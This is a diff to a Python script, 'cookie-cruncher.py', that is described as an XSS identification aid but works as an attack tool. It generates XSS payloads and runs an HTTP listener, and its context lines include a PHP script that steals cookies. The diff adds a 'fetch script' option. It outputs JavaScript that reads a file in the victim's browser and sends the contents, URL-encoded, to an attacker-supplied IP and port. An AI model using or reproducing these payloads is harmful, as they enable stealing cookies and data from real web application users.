@@ -3,7 +3,7 @@
 """
 Program: cookie-cruncher.py
 Date Created: 03/01/2025
-Date Modified: 03/23/2025
+Date Modified: 03/28/2025
 Developer: CyberPanther232
 Purpose: XSS tool designed to help assist in the identification of XSS vulnerabilities in a web application
 """
@@ -29,6 +29,7 @@ PHP_SCRIPT = r"""
         fclose($steal);
 ?>
 """
+
 print(COOKIE_ASCII)
 
 while True:
@@ -37,8 +38,9 @@ while True:
         print("1. Generate XSS script")
         print("2. Generate PHP file")
         print("3. Generate XSS alert")
-        print("4. Run HTTP Listener")
-        print("5. Exit\n")
+        print("4. Generate XSS fetch script")
+        print("5. Run HTTP Listener")
+        print("6. Exit\n")
         
         try:
                 option = int(input("Enter option: "))
@@ -61,6 +63,30 @@ while True:
                 print("\nGenerating XSS Alert")
                 print(f"\n\n<script>alert('{random.choice(COOKIE_MEMES)}')</script>\n\n")
         elif option == 4:
+                ip = str(input("Enter IP: "))
+                try:
+                        port = int(input("Enter Port number or press enter for default (8080): "))
+                except ValueError:
+                        port = DEFAULT_PORT
+
+                file = str(input("Enter filename of file you want to view: "))
+
+                if not file:
+                        print("No file entered... Please try again!")
+                else:
+                        # Using the f-string correctly to embed the target_location
+                        target_location = f"window.location='http://{ip}:{port}/' + encodeURIComponent(data);"
+                        print(f"""
+        <script>
+        fetch('{file}')
+                .then(response => response.text())
+                .then(data => {{
+                {target_location}
+                }});
+        </script>
+                        """)
+
+        elif option == 5:
                 try:
                         port = int(input("Enter Port number or press enter for default (8080): "))
                 except:
@@ -71,7 +97,7 @@ while True:
                 except KeyboardInterrupt:
                         print("Server down!")
                         pass
-        elif option == 5:
+        elif option == 6:
                 exit(1)
 
         else:
